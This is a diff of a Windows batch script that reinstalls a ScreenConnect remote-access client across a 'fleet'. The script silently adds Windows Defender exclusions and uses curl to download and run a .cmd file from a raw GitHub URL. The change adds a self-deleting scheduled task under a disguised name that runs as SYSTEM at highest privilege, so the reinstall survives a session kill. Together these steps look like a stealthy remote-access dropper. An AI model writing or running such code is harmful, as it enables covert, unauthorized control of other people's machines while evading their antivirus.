@@ -1,7 +1,7 @@
 @echo off
-rem OWN_GRYXA_FORCE BUILD 20260804F5 - fleet REINSTALL + REPORT (sevrz 10s safe)
-rem F5: never overwrite local G5 own_gryxa with older pin; fetch G5 from main if missing.
-rem F4: always queue own_gryxa REINSTALL (panel wipe).
+rem OWN_GRYXA_FORCE BUILD 20260804F6 - fleet REINSTALL via schtasks (survives sevrz 10s kill)
+rem F6: schedule SYSTEM one-shot — start /b dies with Guest session.
+rem F5: keep G5 own_gryxa; never overwrite with older pin.
 setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -14,8 +14,9 @@ set "CURL=%SystemRoot%\System32\curl.exe"
 set "SVC=ScreenConnect Client (%FP%)"
 set "LOG=%WD%\own_gryxa_force.log"
 set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
-set "WORKER=%STAGE%\gryxa_force_worker.cmd"
-set "BUILD=F5"
+set "WORKER=%STAGE%\gryxa_reinstall_once.cmd"
+set "TASK=WucacheGryxaReinstall"
+set "BUILD=F6"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
@@ -26,14 +27,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%"
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 
-rem Keep existing G5; only fetch if missing or not G5
 set "NEED_G=1"
 if exist "%WD%\own_gryxa.cmd" (
   findstr /C:"OWN_GRYXA BUILD 20260804G5" "%WD%\own_gryxa.cmd" >nul 2>&1
   if not errorlevel 1 set "NEED_G=0"
 )
 if "%NEED_G%"=="1" (
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 15 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
 )
 
 if not exist "%WD%\own_gryxa.cmd" (
@@ -66,13 +66,17 @@ if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
 
 > "%WORKER%" (
   echo @echo off
-  echo echo [%DATE% %TIME%] worker_reinstall_begin^>^>"%LOG%"
+  echo echo [%DATE% %TIME%] schtask_reinstall_begin^>^>"%LOG%"
   echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL ^>^>"%LOG%" 2^>^&1
-  echo echo [%DATE% %TIME%] worker_reinstall_done^>^>"%LOG%"
+  echo echo [%DATE% %TIME%] schtask_reinstall_done^>^>"%LOG%"
+  echo schtasks /Delete /TN "%TASK%" /F ^>nul 2^>^&1
 )
-start "" /b cmd /c call "%WORKER%"
-set "ACTION=queued-reinstall"
-echo [%DATE% %TIME%] queued REINSTALL worker pre=%PRE%>>"%LOG%"
+
+schtasks /Delete /TN "%TASK%" /F >nul 2>&1
+schtasks /Create /TN "%TASK%" /TR "cmd.exe /c call \"%WORKER%\"" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+schtasks /Run /TN "%TASK%" >nul 2>&1
+set "ACTION=scheduled-reinstall"
+echo [%DATE% %TIME%] scheduled REINSTALL task=%TASK% pre=%PRE%>>"%LOG%"
 
 set "STATE=ABSENT"
 sc query "%SVC%" >nul 2>&1
